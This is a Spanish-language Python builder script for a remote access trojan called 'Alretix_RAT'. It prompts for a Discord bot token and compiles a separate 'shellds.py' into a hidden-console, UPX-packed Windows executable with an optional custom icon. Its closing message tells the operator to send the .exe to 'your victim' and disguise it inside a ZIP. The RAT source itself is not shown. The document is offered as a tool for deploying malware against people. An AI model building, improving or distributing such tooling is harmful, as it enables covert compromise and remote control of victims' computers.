
import os
print('\033[1m' + 'CARGANDO MODULOS...' + '\033[0m')
os.system('python3 -m pip install -r ./modulos.txt')
alretix_rshell = """
\n\n\n\n\n\n\n\n\n\n                                                  
                                                                                










                                      'll'                                      
                                     ;0WW0;                                     
                                    ,0MMMMK:                                    
                                    .dNMMMMXc                                   
                                     .oNMMMMNo.                                 
                                .coooolxOXMMMWx.                                
                               'kWMMMK:..:KMMMWk'                               
                              ,OWMMW0,    ,0WMMWO,                              
                             ;KMMMWk'      'kWMMMK;                             
                             ,cccc:.        .:cccc,                             
                                                                                                
                             \033[1m Alretix_RAT SOURCE CODE \033[0m
                    MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
                    


"""

print(alretix_rshell)


input('\033[1m' + 'Antes de comenzar, debes editar el archivo "shellds.py" y colocar en la variable "token" el TOKEN de tu Bot en "BOT_TOKEN"\n Pulsa Enter cuando termines este paso.' + '\033[0m')

def icon():
    q_icon = input('\033[1m' + '¿Deseas añadir un .ico al .exe?\n Y/N:  ' + '\033[0m')
    if not q_icon:
        icon()

    elif q_icon.lower() == 'y':
        icon_path = input('\033[1m' + 'Coloque su archivo.ico dentro de la carpeta llamada "icon" y escriba el nombre del archivo\n Ejemplo: icon.ico\n: ' + '\033[0m')
        if not icon_path:
            icon_path = 'NONE'
        return './icon/'+icon_path
    elif q_icon.lower() == 'n':
        icon_path = 'NONE'
        return icon_path
    else:
        icon()


def compile_to_exe():
    y_n = input('\033[1m' + '¿Quieres compilar el Archivo a .exe?\n Y/N:  ' + '\033[0m')
    
    if not y_n:
        compile_to_exe()
    elif y_n.lower() == 'y':
        os.system(f'python3 -m PyInstaller --onefile --noconsole "./shellds.py" --upx-dir "/upx/" --icon "{icon()}"')
    elif y_n.lower() == 'n':
        input('\033[1m' + 'Pulsa Enter para Cerrar esta ventana o pulsa cualquier otra tecla.' + '\033[0m')
        exit()
    else:
        compile_to_exe()
compile_to_exe()
print('\n\n\n\n\n\n\n\n\n\n ')
print('\033[1m' + 'El proceso ha finalizado, el archivo .exe se encuentra en la carpeta "dist", enviaselo a tu victima y espera a que lo ejecute\n (DISFRAZA BIEN EL ARCHIVO EN UN ZIP O INGENIATELAS)' + '\033[0m')
print('\n\n\n\n\n\n\n\n\n\n ')
